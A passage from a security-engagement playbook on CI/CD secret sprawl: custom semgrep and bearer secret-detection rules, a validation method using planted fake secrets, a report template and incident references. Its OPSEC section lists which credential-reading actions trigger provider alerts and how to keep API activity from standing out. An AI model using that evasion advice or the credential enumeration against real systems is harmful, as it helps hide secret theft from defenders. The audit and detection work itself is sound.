semgrep --config custom_secrets.yml . --junit-xml -o junit.xml   # for CI dashboards
```

---

## 11. bearer Custom Rule Authoring

bearer is a flow-aware SAST — its strength is tracking how a secret flows from definition to sink, with native support for many languages. Its rule format (called "recipes") is YAML with `dataflow` semantics built in.

### 11.1 bearer Rule File Structure

```yaml
# custom_bearer.yml
languages:
  - javascript
  - typescript
  - python

rules:
  - id: client_secret_to_log
    description: Client secret value passed to a logging function
    severity: critical
    metadata:
      cwe_id: 532
      classification: secret
    pattern:
      patterns:
        - pattern: |
            $LOGGER($DATA)
        - pattern-either:
            - pattern-inside: |
                const $SECRET = process.env.$KEY
                ...
            - pattern-inside: |
                $SECRET = os.environ[$KEY]
                ...
```

### 11.2 Running bearer

```bash
# Basic scan with custom recipe
bearer scan --config custom_bearer.yml .

# Dataflow-only scan (most useful for secret tracking)
bearer scan --dataflow --config custom_bearer.yml .

# Output formats
bearer scan --format json --output findings.json .
bearer scan --format sarif --output findings.sarif .
```

### 11.3 Cross-Checking semgrep + bearer

Run both on the same codebase and cross-reference findings:

```bash
semgrep --config custom_secrets.yml . --json -o semgrep.json
bearer scan --dataflow --config custom_bearer.yml --format json --output bearer.json .

# Extract and dedupe findings by file:line:secret-hash
jq -r '.results[] | "\(.path):\(.start.line):\(.extra.severity)"' semgrep.json \
  | sort -u > semgrep_findings.txt
jq -r '.findings[] | "\(.filename):\(.line_number):\(.severity)"' bearer.json \
  | sort -u > bearer_findings.txt

# Findings in both tools (high confidence)
comm -12 semgrep_findings.txt bearer_findings.txt > high_confidence.txt
# Findings only in semgrep (medium confidence — review)
comm -23 semgrep_findings.txt bearer_findings.txt > semgrep_only.txt
# Findings only in bearer (medium confidence — review)
comm -13 semgrep_findings.txt bearer_findings.txt > bearer_only.txt
```

---

## 12. Validation Methodology — Planting and Measuring

The single biggest failure mode in custom-rule authoring is shipping a rule that matches 90% of planted secrets but also matches 40% of unrelated code (false positives), leading to alert fatigue and the rule being disabled.

### 12.1 Validation Set Construction

Build a labeled dataset of 40 entries:

- 20 positive samples (real-format secrets)
- 10 negative samples (test/example/placeholder values that should NOT match)
- 10 "near miss" samples (strings that look similar but are not secrets — variable names, env var references, etc.)

```bash
mkdir -p validation && cd validation

# 20 positive samples — REPLACE_WITH_YOUR_REAL_FORMAT placeholders
for i in $(seq 1 20); do
  echo "client_api_key_$(head -c 30 /dev/urandom | base64 | tr -dc 'A-Za-z0-9' | head -c 40)" \
    > "positive_${i}.txt"
done

# 10 negative samples
for v in example test placeholder your_key replace_with sample demo dummy fake redacted; do
  echo "client_api_key_${v}" > "negative_${v}.txt"
done

# 10 near-miss samples
for i in $(seq 1 10); do
  echo "CLIENT_API_KEY=REPLACE_WITH_YOUR_KEY" > "nearmiss_${i}.txt"
done

# Run scanners
gitleaks detect --source . --config ../custom_gitleaks.json --no-git --report-path gitleaks.json
semgrep --config ../custom_secrets.yml . --json -o semgrep.json
bearer scan --config ../custom_bearer.yml --format json --output bearer.json .
```

### 12.2 Computing Precision and Recall

```bash
# True positives = positives matched
tp=$(jq '[.[] | select(.RuleID == "client-internal-api-key")] | length' gitleaks.json)

# False negatives = positives missed (20 - tp)
fn=$((20 - tp))

# False positives = negatives matched
fp=$(jq '[.[] | select(.File | test("negative_"))] | length' gitleaks.json)

# True negatives = negatives not matched (10 - fp)
tn=$((10 - fp))

precision=$(awk "BEGIN {printf \"%.1f\", ${tp} / (${tp} + ${fp}) * 100}")
recall=$(awk "BEGIN {printf \"%.1f\", ${tp} / (${tp} + ${fn}) * 100}")
f1=$(awk "BEGIN {p=${tp}/(${tp}+${fp}); r=${tp}/(${tp}+${fn}); printf \"%.2f\", 2*p*r/(p+r)}")

echo "Precision: ${precision}%"
echo "Recall:    ${recall}%"
echo "F1 score:  ${f1}"
```

### 12.3 Acceptance Thresholds

| Metric | Minimum | Target |
|--------|---------|--------|
| Precision | 90% | 95%+ |
| Recall | 90% | 95%+ |
| F1 | 0.90 | 0.95+ |
| False-positive rate (negatives matched) | <15% | <5% |

If precision is below 90%: tighten `allowlist`, add a more specific `regex`, or add a keyword pre-filter. If recall is below 90%: the `regex` is too strict — loosen it or add variant patterns.

### 12.4 Iterative Tuning Loop

```
1. Draft rule
2. Run against validation set
3. Compute precision + recall
4. If precision < 90%:
   - Identify top false-positive patterns
   - Add them to allowlist OR tighten regex
5. If recall < 90%:
   - Identify top false-negative patterns
   - Loosen regex OR add second rule variant
6. Re-run, repeat until precision and recall both ≥ 95%
7. Ship to CI
```

A typical ruleset takes 3-5 iterations to reach the 95%/95% target. Skipping this loop is the single most common reason custom-rule projects fail in production — the ruleset goes live, generates 200 false positives in week one, gets disabled, and never comes back.

---

## 13. OPSEC for CI/CD Audit

### 13.1 What Triggers Provider Alerting

| Action | Provider | Alert Risk |
|--------|----------|------------|
| `gh api` for every workflow file | GitHub | LOW (looks like normal CI tooling) |
| Reading `.gitlab-ci.yml` via API | GitLab | LOW |
| Reading project/group variables via API | GitLab | MEDIUM (admin-level call) |
| Reading Jenkins `/credentials/` | Jenkins | MEDIUM (admin audit log entry) |
| Jenkins Script Console execution | Jenkins | HIGH (audit trail entry + log) |
| CircleCI context env var read | CircleCI | MEDIUM (audit log entry per call) |
| Terraform Cloud state download | TFC | MEDIUM (state download is logged) |
| Running custom gitleaks locally | All | NONE (local-only) |
| Pushing a repo with a planted secret | GitHub | HIGH (Secret Scanning fires on push) |

### 13.2 Safe Egress Patterns

- **Always clone locally** before scanning. `gh repo clone` produces no different signature from a normal CI operation.
- **Avoid the GitHub Contents API in tight loops** — it has rate limits and audit logs. Prefer `gh repo clone` + filesystem scan.
- **Stagger CI/CD API calls** — a 1-2 second delay between API calls reduces the spike signature.
- **Use a single, low-privilege token** — a `read:org` scope GitHub PAT looks like normal SAST scanning; an admin token with all scopes is suspicious.
- **Never trigger a workflow** — reading YAML is safe; running it is HIGH risk (a fork-PR triggered workflow that runs your code is also a security event for the defender).

### 13.3 Egress Sanitization

When harvesting findings, sanitize before they hit disk:

```bash
# Redact secret values before writing to disk
gitleaks detect --source . --report-path leaks.json --redact
trufflehog git file://. --json --no-update --results=verified,unknown | \
  jq 'del(.RawV2, .Raw)' > trufflehog_redacted.jsonl

# Mask secrets in findings
jq '(.Raw // "" | .[0:4] + "..." + .[-4:]) as $masked | .Raw = $masked' findings.json
```

The principle: never let the full secret value touch long-term storage. Findings live in tmpfs, are masked on write, and are shredded at engagement end.

---

## 14. Report Assembly — CI/CD Sprawl Heat Map

### 14.1 Heat Map Template

```markdown
## CI/CD Secret Sprawl Heat Map

### Coverage

| Provider | Repos Audited | Workflows Inspected | Secrets Referenced |
|----------|---------------|---------------------|--------------------|
| GitHub Actions | 412 | 1,247 | 89 |
| GitLab CI | 67 | 142 | 34 |
| Jenkins | 18 folders | 312 jobs | 56 |
| CircleCI | 8 projects | 31 pipelines | 22 |
| Terraform Cloud | 1 org | 84 workspaces | 41 |
| **Total** | **505** | **1,816** | **242** |

### High-Risk Patterns Detected

| Pattern | Count | Severity |
|---------|-------|----------|
| `pull_request_target` + `secrets.*` | 12 | CRITICAL |
| Unmasked GitLab CI variable in `script:` echo | 31 | HIGH |
| Jenkins `withCredentials` with process-argument binding | 8 | HIGH |
| `.tfstate` files committed to repo | 4 | HIGH |
| Self-hosted runner on public repo | 3 | HIGH |
| Custom-rule SAST findings (client proprietary tokens) | 67 | MEDIUM-HIGH |

### Blast Radius

Top 3 single-secrets with widest blast radius:

1. **`PROD_DEPLOY_KEY`** (GitHub Actions, used in 23 workflows across 12 repos) → production deploy access
2. **`TF_VAR_db_password`** (Terraform Cloud, referenced by 14 workspaces) → all managed databases
3. **`argocd-repo-creds`** (Argo CD, cluster-wide) → every Git-deployed application

### Recommendations (Prioritized)

1. **Immediate**: Rotate the 3 widest-blast-radius secrets above and migrate to OIDC federation.
2. **Within 2 weeks**: Fix every `pull_request_target` + `secrets.*` workflow (12 findings).
3. **Within 1 month**: Migrate all unmasked GitLab CI variables to masked + protected.
4. **Within 1 quarter**: Deploy custom gitleaks + semgrep rulesets to CI on every PR.
```

### 14.2 Per-Secret Findings Table

| Secret Name | Provider | Repo/Project | Used By | Severity | Rotation Status |
|-------------|----------|--------------|---------|----------|----------------|
| `PROD_DEPLOY_KEY` | github | client/legacy-deploy | 23 workflows | CRITICAL | rotated |
| `DB_PASSWORD` | gitlab | client/api | 4 pipelines | HIGH | pending |
| `argocd-repo-creds` | argo | cluster-wide | every app | CRITICAL | NOT ROTATED |

### 14.3 SAST Ruleset Hand-Off

The custom gitleaks + semgrep + bearer rulesets developed during the engagement are deliverables. Package them with:

```bash
mkdir -p client-ruleset/{gitleaks,semgrep,bearer}
cp custom_gitleaks.json client-ruleset/gitleaks/
cp custom_secrets.yml client-ruleset/semgrep/
cp custom_bearer.yml client-ruleset/bearer/
cp validation/precision_recall.md client-ruleset/
tar czf client-ruleset.tar.gz client-ruleset/
```

Include the precision/recall numbers from §12.2 so the client has confidence in the ruleset's quality.

---

## 15. Cross-References

- **`skills/secret-management-attack/SKILL.md`** — skill definition and six-phase methodology
- **`skills/secret-management-attack/payloads.md`** — every command catalogued by section, especially §3 (semgrep), §4 (bearer), §11 (CI/CD), §15 (custom regex)
- **`skills/secret-management-attack/test-cases.md`** — TC-SM-001 through TC-SM-018 (the TC-SM-013 through TC-SM-018 set is dedicated to CI/CD sprawl and SAST rule authoring)
- **`guides/secret-management-attack-playbook.md`** — end-to-end workflow from scope through report
- **`guides/vault-and-cloud-kms-attack-playbook.md`** — Vault and cloud KMS exploitation depth
- **`skills/supply-chain-security/SKILL.md`** — CI/CD supply chain (Codecov, tj-actions/changed-files, SolarWinds-class)
- **`skills/container-security/SKILL.md`** — runtime container protection (relevant for self-hosted runner hosts)
- **`skills/cloud-security/SKILL.md`** — IAM and workload identity (relevant for cloud-deployed CI/CD)
- **`skills/web-auth-bypass/SKILL.md`** — relevant when harvested CI/CD secrets are JWT or OAuth tokens

---

## 16. Real-World Incident References and Further Reading

- **Codecov bash uploader supply chain (2021)**: attacker modified the bash uploader to exfiltrate environment variables from CI runs — including cloud credentials, tokens, and SSH keys — for two months before detection. Demonstrates the OPSEC risk of any tool that runs in CI with secret-laden env vars.
- **CircleCI secret leak (2023)**: undisclosed breach led CircleCI to rotate every customer's OAuth token — demonstrating that CI provider-side compromise has cascading blast radius across thousands of customer pipelines.
- **GitHub Actions `tj-actions/changed-files` compromise (2025)**: attacker modified the popular action to exfiltrate `secrets.*` from workflows using it — demonstrating that any third-party action is a transitive secret surface.
- **SolarWinds build pipeline (2020)**: attacker compromised the build server and injected backdoor into the signed binary — orthogonal to secret theft but illustrates the broader CI/CD trust model.
- **gitleaks custom rules**: [gitleaks.io/config](https://gitleaks.io/config/) — official docs on rule syntax, allowlists, and entropy.
- **semgrep rule syntax**: [semgrep.dev/docs/writing-rules](https://semgrep.dev/docs/writing-rules/) — pattern operators, metavariables, taint mode.
- **bearer recipes**: [github.com/Bearer/bearer/tree/main/pkg](https://github.com/Bearer/bearer) — rule format and built-in recipes.
- **GitHub Actions `pull_request_target` advisory**: [securitylab.github.com/research](https://securitylab.github.com/research/) — multiple writeups on the exfil pattern.
- **OWASP Top 10 for CI/CD**: [owasp.org/www-project-top-10-ci-cd-security-risks](https://owasp.org/www-project-top-10-ci-cd-security-risks/) — framework for evaluating CI/CD risk posture.

---

## 17. Closing Notes

CI/CD secret sprawl is the highest-leverage finding category in modern engagements because the credentials harvested from a forgotten 2022 workflow still deploy to production in 2026. The defensive posture — OIDC federation, environment-scoped secrets, rotation discipline — is well understood but unevenly adopted. The offensive playbook therefore has consistent value: enumerate every provider, parse every workflow, write a custom rule for every proprietary format, validate before shipping, and report blast radius in business terms (which production system does this leaked credential reach?).

The discipline that distinguishes a competent secret-management auditor from a junior one is **validation before shipping**. A custom ruleset that hits 95% precision and 95% recall on the validation set is a deliverable. A ruleset that hits 70% precision gets disabled in week one and never comes back. Build the validation set first; tune the rules second; ship third. The order matters.
